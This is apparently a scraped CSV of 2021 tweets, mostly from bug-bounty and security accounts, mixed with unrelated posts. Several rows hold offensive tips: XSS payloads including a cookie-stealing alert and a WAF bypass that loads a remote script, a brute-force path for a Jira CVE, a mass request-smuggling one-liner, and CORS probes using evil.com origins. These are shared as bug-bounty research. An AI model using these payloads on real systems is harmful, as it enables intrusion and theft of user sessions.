Name,Handle,Timestamp,Verified,Content,Comments,Retweets,Likes,Analytics,Tags,Mentions,Emojis,Profile Image,Tweet Link,Tweet ID
Teguh Aprianto,@secgron,2021-05-02T15:46:41.000Z,True,"Lo bisa mulai menjadi cyber security consultant tanpa sertifikasi, yang dibutuhin cuma portfolio. Karena kebanyakan orang baru pada ngambil sertifikasi itu  setelah mereka kerja.

Soal gaji berkali-kali lipat dari UMR Jakarta. Harus siap ga dicintai oleh developer yang in charge.",4,52,244,0,[],[],[],https://pbs.twimg.com/profile_images/1639792862387896320/v7tahJWq_normal.jpg,https://twitter.com/secgron/status/1388882645728169984,tweet_id:1388882645728169984
ProjectDiscovery.io,@pdiscoveryio,2021-05-03T10:29:56.000Z,False,"It's been a year since we published  project, We completed 1000+ templates including 300+ cves templates ready to scan/use by everyone, Community contributions have made the project what it is.https://github.com/projectdiscovery/nuclei-templates…#Opensource #Community #CyberSecurity",2,58,182,0,"['#Opensource', '#Community', '#CyberSecurity']",['@pdnuclei'],[],https://pbs.twimg.com/profile_images/1755971513293938688/Nh3AXrZn_normal.jpg,https://twitter.com/pdiscoveryio/status/1389165321160822792,tweet_id:1389165321160822792
InfoSec Community,@InfoSecComm,2021-05-02T12:57:29.000Z,True,"New Write-up on InfoSec Write-ups publication : ""RCE via Internal Access to Adminer Database Management (Critical)"" #bugbounty #bugbountywriteup #bugbountytips",0,12,30,0,"['#bugbounty', '#bugbountywriteup', '#bugbountytips']",[],[],https://pbs.twimg.com/profile_images/1722351310673219584/qnpl-IWo_normal.jpg,https://twitter.com/InfoSecComm/status/1388840063212064772,tweet_id:1388840063212064772
TomNomNom,@TomNomNom,2021-04-30T11:18:50.000Z,False,Bloody love kecap manis. 10/10 would recommend,7,1,30,0,[],[],[],https://pbs.twimg.com/profile_images/1186996403354132480/1NKFlwCt_normal.jpg,https://twitter.com/TomNomNom/status/1388090464969056256,tweet_id:1388090464969056256
SAFE,@0x21SAFE,2021-04-22T13:23:18.000Z,False,I didn't know that  is calculating the severity using their feelings.,1,3,16,0,[],['@GoogleVRP'],[],https://pbs.twimg.com/profile_images/1448503614188761091/Bo7HBtiG_normal.jpg,https://twitter.com/0x21SAFE/status/1385222683927973889,tweet_id:1385222683927973889
Muhammad Daffa,@daffainfo,2021-04-29T12:42:20.000Z,False,"kenapa charger laptop rusak pas hectic""nya :(",0,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1387749088238600199,tweet_id:1387749088238600199
DIMOOON,@reewardius,2021-04-25T15:42:45.000Z,False,assetfinder $target > subs.txt; cat subs.txt | httpx -threads 300 -silent | python3 http://smuggler.pyhttps://github.com/defparam/smuggler…#smuggler #bugbounty #pentest #bugbountytip,1,59,97,0,"['#smuggler', '#bugbounty', '#pentest', '#bugbountytip']",[],[],https://pbs.twimg.com/profile_images/1623343900298469381/KaO39wqj_normal.jpg,https://twitter.com/reewardius/status/1386344942478446595,tweet_id:1386344942478446595
0xW43L,@GhnimiWael,2021-04-28T05:59:07.000Z,False,"Some notes from ""How to Crush Bug Bounties in the first 12 Months"" by  
  #bugbountytips   #BugBounty",12,283,620,0,"['#bugbountytips', '#BugBounty']",['@hakluke'],[],https://pbs.twimg.com/profile_images/1576212143145377792/1OOTByNh_normal.jpg,https://twitter.com/GhnimiWael/status/1387285229006696452,tweet_id:1387285229006696452
nuclei,@pdnuclei,2021-04-27T19:22:58.000Z,False,[Blog] Exploiting Race Conditions in Web Application using Nuclei —https://blog.projectdiscovery.io/exploiting-race-conditons/…#security #appsec #bugbounty #hackwithautomation,1,125,324,0,"['#security', '#appsec', '#bugbounty', '#hackwithautomation']",[],[],https://pbs.twimg.com/profile_images/1678872858431201282/rWgndGa1_normal.png,https://twitter.com/pdnuclei/status/1387125134633234432,tweet_id:1387125134633234432
rizal.,@rizalchoirur_,2021-04-25T09:01:10.000Z,False,Reflected XSS on Microsoft #bugbounty #bugbountytips #xsswriteup: https://n45ht.or.id/post/reflected-xss-on-microsoft/en…,4,26,80,0,"['#bugbounty', '#bugbountytips', '#xss']",[],[],https://pbs.twimg.com/profile_images/1128439187345010689/nRnAi3Ga_normal.png,https://twitter.com/rizalchoirur_/status/1386243880442499072,tweet_id:1386243880442499072
Jafar Abo Nada,@Jafar_Abo_Nada,2021-04-24T20:44:59.000Z,False,"This is exploit bug that I discovered in jira

PoC CVE-2020-36287 

Brute Force <GadgetId> start from 10000 to 19999

{BaseUrl}/rest/dashboards/1.0/10000/gadget/<GadgetId>/prefs

If server response 401 bug Fixed, If the server's response is 200, the response will contain XML data",3,99,338,0,[],[],[],https://pbs.twimg.com/profile_images/1778854804330008576/p6Gkm9Vf_normal.jpg,https://twitter.com/Jafar_Abo_Nada/status/1386058611084890116,tweet_id:1386058611084890116
Frogy,@iamthefrogy,2021-04-23T13:28:01.000Z,False,Shadow IT Tip - Finding an abandoned asset.#threatintelligence #shadowit #bugbounty #applicationsecurity #vulnerabilitymanagement #assetmanagement #assetinventory #certificate,0,13,26,0,"['#threatintelligence', '#shadowit', '#bugbounty', '#applicationsecurity', '#vulnerabilitymanagement', '#assetmanagement', '#assetinventory', '#certificate']",[],[],https://pbs.twimg.com/profile_images/1681783187695972352/2Ug8A37g_normal.jpg,https://twitter.com/iamthefrogy/status/1385586259469508611,tweet_id:1385586259469508611
Muhammad Daffa,@daffainfo,2021-04-23T13:04:54.000Z,False,setresss,0,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1385580441084710914,tweet_id:1385580441084710914
George Moller,@_georgemoller,2021-04-21T15:57:42.000Z,True, Avoid this 7 common React mistakes Thread ,8,145,596,0,[],[],"['\\U0001f6a8', '\\U0001f9f5', '\\U0001f447']",https://pbs.twimg.com/profile_images/1491891173857935365/HJllYRJW_normal.jpg,https://twitter.com/_georgemoller/status/1384899152912560129,tweet_id:1384899152912560129
D∆₹KLÖ†Û$,@darklotuskdb,2021-04-22T16:17:55.000Z,False,Account TakeOver(#ATO) By Locking The Cookies. #HR51KDB #bugbountytip,13,156,315,0,"['#ATO', '#HR51KDB', '#bugbountytip']",[],[],https://pbs.twimg.com/profile_images/1407250988180799489/WIPOA0rf_normal.jpg,https://twitter.com/darklotuskdb/status/1385266624727379972,tweet_id:1385266624727379972
blueblue,@piedpiper1616,2021-04-21T11:20:14.000Z,False,GitHub - Henry4E36/Solr-SSRF: Apache Solr SSRF(CVE-2021-27905) -,0,39,88,0,[],[],[],https://pbs.twimg.com/profile_images/864850495260639232/Dc1F7l4y_normal.jpg,https://twitter.com/piedpiper1616/status/1384829323660521476,tweet_id:1384829323660521476
Muhammad Daffa,@daffainfo,2021-04-21T06:06:34.000Z,False,"yang nyari anak fb
yang claim anak twitter

wkwkwk",2,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1384750386720874498,tweet_id:1384750386720874498
Ptrace Security GmbH,@ptracesecurity,2021-04-20T10:06:43.000Z,False,Android application exploitation of a Digital Bank  https://stevebiotech.medium.com/android-application-exploitation-of-a-digital-bank-5809360838ac…  #AndroidSecurity #MobileSecurity #BankingSecurity #Infosec,0,54,157,0,"['#AndroidSecurity', '#MobileSecurity', '#BankingSecurity', '#Infosec']",[],[],https://pbs.twimg.com/profile_images/1661839689425514496/vIpLCIox_normal.jpg,https://twitter.com/ptracesecurity/status/1384448435307352065,tweet_id:1384448435307352065
Tarun mahour,@sratarun,2021-04-19T06:47:49.000Z,False,I love bypass :)  ,9,164,441,0,[],"['@ADITYASHENDE17', '@ADITYASHENDE17', '@Alra3ees']",[],https://pbs.twimg.com/profile_images/1573197376952696833/Ho9xXxCL_normal.png,https://twitter.com/sratarun/status/1384035993309700096,tweet_id:1384035993309700096
Edo Maland,@screetsec,2021-04-19T05:44:24.000Z,False,"Hi folks, I would like to share a free ebook about my recon workflow, tools, POV, & some idea. Leastwise, this might work & help to increase the effectiveness when doing pentest, red team & bug hunting. Thank & hope you like it, download on https://s.id/zZ5-B#bugbountytips",1,18,25,0,['#bugbountytips'],[],[],https://pbs.twimg.com/profile_images/1412840321625427968/6wjHqNyP_normal.jpg,https://twitter.com/screetsec/status/1384020033391652873,tweet_id:1384020033391652873
Muhammad Daffa,@daffainfo,2021-04-18T23:36:37.000Z,False,Get well soon mangadex! https://x.com/MangaDex/statu/MangaDex/status/1383796420700901381…,0,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1383927478918389767,tweet_id:1383927478918389767
Manas,@ManasH4rsh,2021-04-18T16:54:58.000Z,False,"Extract all endpoints from  a JS File with this oneliner:)

cat files.txt | grep -aoP ""(?<=(\""|\'|`))\/[a-zA-Z0-9?&=\/-#.](?=(\""|\'|`))"" | sort -u | tee output.txt#bugbountytips",7,234,751,0,['#bugbountytips'],[],[],https://pbs.twimg.com/profile_images/1762718535728746497/caEwFVtS_normal.jpg,https://twitter.com/ManasH4rsh/status/1383826399392194565,tweet_id:1383826399392194565
M3m3lord,@memefess,2021-04-17T15:35:04.000Z,True,yeet! ,4,321,891,0,[],[],"['\\U0001f614', '\\U0001f614', '\\U0001f614']",https://pbs.twimg.com/profile_images/1757673166263209984/tX1Z3xUQ_normal.jpg,https://twitter.com/memefess/status/1383443902867279877,tweet_id:1383443902867279877
Muhammad Daffa,@daffainfo,2021-04-15T14:28:16.000Z,False,Auto block kalo ada yang kayak gini,0,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1382702315556192256,tweet_id:1382702315556192256
khan mamun,@mamunwhh,2021-04-12T06:48:50.000Z,False,"Reflected xss successfull payload for me:

1.<b onmouseover=alert('Wufff!')>click me!</b>
2.""><script>propmt(""mamunwhh"")</script>
3.""><script>alert(document.cookie)</script>
4. /><svg src=x onload=confirm(""1337"");>#bugbountytips",3,97,205,0,['#bugbountytips'],[],[],https://pbs.twimg.com/profile_images/1736982520967909376/sgC_MGTF_normal.jpg,https://twitter.com/mamunwhh/status/1381499532567961601,tweet_id:1381499532567961601
Noisy Hacker,@noisy_hacker,2021-04-12T07:56:30.000Z,False,Mass Hunting of SQLI (copied)  #bugbountytips  #infosec #sqli #bugbounty,3,53,133,0,"['#bugbountytips', '#infosec', '#sqli', '#bugbounty']",[],[],https://pbs.twimg.com/profile_images/1394907001705013249/wo6FfHEY_normal.jpg,https://twitter.com/noisy_hacker/status/1381516561878409222,tweet_id:1381516561878409222
Muhammad Daffa,@daffainfo,2021-04-11T16:25:49.000Z,False,"Thank you guys for 835 stars, but still I'm very busy this month until July, I hope I can update this repo regularly#bugbountytips #bugbountytip #bugbounty",0,7,4,0,"['#bugbountytips', '#bugbountytip', '#bugbounty']",[],[],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1381282348579266560,tweet_id:1381282348579266560
Muhammad Daffa,@daffainfo,2021-04-11T00:30:50.000Z,True,Sebentar doang sih 1-2 detikan,0,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1381042018978177026,tweet_id:1381042018978177026
Intigriti,@intigriti,2021-04-10T12:20:02.000Z,True,,21,78,574,0,[],[],[],https://pbs.twimg.com/profile_images/1740712382903488512/rHiQfQ4Z_normal.jpg,https://twitter.com/intigriti/status/1380858108285685764,tweet_id:1380858108285685764
アニメ ソードアート・オンライン 公式,@sao_anime,2021-04-10T01:00:00.000Z,True,"◤ムビチケカード発売中◢

本日からの『劇場版 SAO -プログレッシブ- 星なき夜のアリア』劇場展開を記念し、4/16(金)までに公式Twitterをフォロー＆このツイートをRTした方の中から5名様にキービジュアル第2弾のB2ポスターをプレゼント！ぜひご参加ください！

▷https://sao-p.net/ticket/#sao_anime",85,1万,"9,086",0,['#sao_anime'],[],[],https://pbs.twimg.com/profile_images/1752282349361074176/yunVzLmq_normal.jpg,https://twitter.com/sao_anime/status/1380686969911513088,tweet_id:1380686969911513088
BMKG,@infoBMKG,2021-04-10T07:05:02.000Z,True,"#Gempa Mag:6.7, 10-Apr-21 14:00:15 WIB, Lok:8.95 LS,112.48 BT (90 km BaratDaya KAB-MALANG-JATIM), Kedlmn:25 Km, tdk berpotensi tsunami #BMKG","4,643",4.5万,6.9万,0,"['#Gempa', '#BMKG']",[],[],https://pbs.twimg.com/profile_images/1076479887056154627/u0KZkg3a_normal.jpg,https://twitter.com/infoBMKG/status/1380778835851927555,tweet_id:1380778835851927555
Sword Art Online,@SwordArtUSA,2021-04-09T15:02:55.000Z,False, Happy Birthday Alice Zuberg!! ,61,540,"4,962",0,[],[],"['\\U0001f382', '\\U0001f382']",https://pbs.twimg.com/profile_images/1760952937998938112/L4aENnHN_normal.jpg,https://twitter.com/SwordArtUSA/status/1380536711139225601,tweet_id:1380536711139225601
HackerOne,@Hacker0x01,2021-04-08T13:00:44.000Z,True,The AWS CTF is going on now! Join at http://ctf.hacker101.com to test your #cloud #hacking skills. #TogetherWeCTFHarder,4,44,118,0,"['#cloud', '#hacking', '#TogetherWeCTFHarder']",[],[],https://pbs.twimg.com/profile_images/1511784317336399881/PMWMmbSS_normal.jpg,https://twitter.com/Hacker0x01/status/1380143573354610689,tweet_id:1380143573354610689
Muhammad Daffa,@daffainfo,2021-04-07T02:49:54.000Z,False,Flexingnya pake github,0,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1379627465501417474,tweet_id:1379627465501417474
4n6lady,@4n6lady,2021-04-04T00:23:48.000Z,True,"SOC Myths:
-SOC deals with 1000s of alerts daily Nope, that's just a ""monitoring center""
-More alerts = good SOC Again, nope, aim for 0. 
-Most analysts are bored  You shouldn't be chasing alerts and closing tickets. You need to analyze, hunt, investigate (rinse and repeat)",13,95,481,0,[],[],"['\\u274c', '\\u274c', '\\u274c']",https://pbs.twimg.com/profile_images/1750904260500586496/SBnxn-AP_normal.jpg,https://twitter.com/4n6lady/status/1378503532404482050,tweet_id:1378503532404482050
Muhammad Daffa,@daffainfo,2021-04-04T02:24:42.000Z,False,kuliah mulai keteteran awkwakwakkwa,0,0,0,0,[],[],[],https://pbs.twimg.com/profile_images/1231455926864904195/_rZ8earu_normal.jpg,https://twitter.com/daffainfo/status/1378533959894626305,tweet_id:1378533959894626305
Youssef Sammouda (sam0),@samm0uda,2021-04-01T23:29:29.000Z,False,I had a crazy week in February in which i was able to find 3 interesting account takeovers in Facebook and resulted a total of $100k in bounties. I'm sharing details about two of them and soon the third:https://ysamm.com/?p=646https://ysamm.com/?p=654,39,377,"1,332",0,[],[],[],https://pbs.twimg.com/profile_images/1755685157502128128/Jghy25qJ_normal.jpg,https://twitter.com/samm0uda/status/1377765087474286598,tweet_id:1377765087474286598
アニメ『ゆるキャン△』シリーズ公式,@yurucamp_anime,2021-04-01T03:00:00.000Z,True,"／
映画『ゆるキャン△』
2022年全国ロードショー決定！
＼

既に制作が発表されている映画『ゆるキャン△』が2022年全国ロードショー決定！さらに #京極義昭 監督が描いたイメージボードを使用したコンセプトビジュアルも公開！続報を楽しみにお待ちくださいhttps://yurucamp.jp/news/information/6469…#ゆるキャン",427,3.4万,6.3万,0,"['#京極義昭', '#ゆるキャン']",[],['\\u2728'],https://pbs.twimg.com/profile_images/1775900400451018752/dNIWS1BO_normal.jpg,https://twitter.com/yurucamp_anime/status/1377455681163259907,tweet_id:1377455681163259907
Ashraf Harb,@ashrafharb97,2021-03-28T21:57:54.000Z,False,"I have published my first English Write-up about 

CSRF issue and how I chained it with misconfiguration that server doesn't validate the password is deleted from the change email request to gain Account Takeover Impact #bugbountytips #BugBounty",1,43,99,0,"['#bugbountytips', '#BugBounty']",[],[],https://pbs.twimg.com/profile_images/1355988366077128706/ulSHEfu6_normal.jpg,https://twitter.com/ashrafharb97/status/1376292487938113540,tweet_id:1376292487938113540
Ptrace Security GmbH,@ptracesecurity,2021-03-29T04:55:03.000Z,False,Bug Bounty Roadmaps  https://github.com/1ndianl33t/Bug-Bounty-Roadmaps…  #Pentesting #BugBounty #CyberSecurity #Infosec,3,177,558,0,"['#Pentesting', '#BugBounty', '#CyberSecurity', '#Infosec']",[],[],https://pbs.twimg.com/profile_images/1661839689425514496/vIpLCIox_normal.jpg,https://twitter.com/ptracesecurity/status/1376397469433663489,tweet_id:1376397469433663489
zonduu,@zonduu1,2021-03-29T05:36:48.000Z,False,"XSS WAF Bypass:

<img+a='a+<!--'+a="">""'+""<script+a+src=https://zonduu.me/ALERTXSS.JS>a</script>

Reflected as:
<img a='a <!--' a=\"">\""' \""<script a src=https://zonduu.me/ALERTXSS.JS>a</script>

Explanation: Script tags don't work inside a <img> tags so the WAF was allowing me to add them 1/2",3,44,103,0,[],[],[],https://pbs.twimg.com/profile_images/1565033086584233984/LJNGzJud_normal.jpg,https://twitter.com/zonduu1/status/1376407975724744706,tweet_id:1376407975724744706
Imran Parray,@imranparray101,2021-03-29T06:18:28.000Z,False,"Looking for BAC issues, Try this to find hidden endpoints:#bugbountytips",1,26,71,0,['#bugbountytips'],[],[],https://pbs.twimg.com/profile_images/1735193697246162944/oWWNY67I_normal.jpg,https://twitter.com/imranparray101/status/1376418460633346050,tweet_id:1376418460633346050
txtdariprogrammer,@txtdrprogramer,2021-03-29T03:17:11.000Z,False,((Nude)),48,104,297,0,[],[],[],https://pbs.twimg.com/profile_images/1282192035747782657/4K8O8lw7_normal.jpg,https://twitter.com/txtdrprogramer/status/1376372841742958599,tweet_id:1376372841742958599
Muhammad Fauzan,@Fozisimi143,2021-03-28T22:14:48.000Z,False,"Bypass CORS MISCONFIGURATION technique

1) origin : https://evil.com      -> No Response 
2) origin : https://site.com.evil.com     -> No Response
3) origin : http://evil.com 
     -> Access-control-allow-origin : http://evil.comTip : without use https://",4,70,227,0,[],[],[],https://pbs.twimg.com/profile_images/1606733826813820931/WaOTx8A3_normal.jpg,https://twitter.com/Fozisimi143/status/1376296741536993281,tweet_id:1376296741536993281
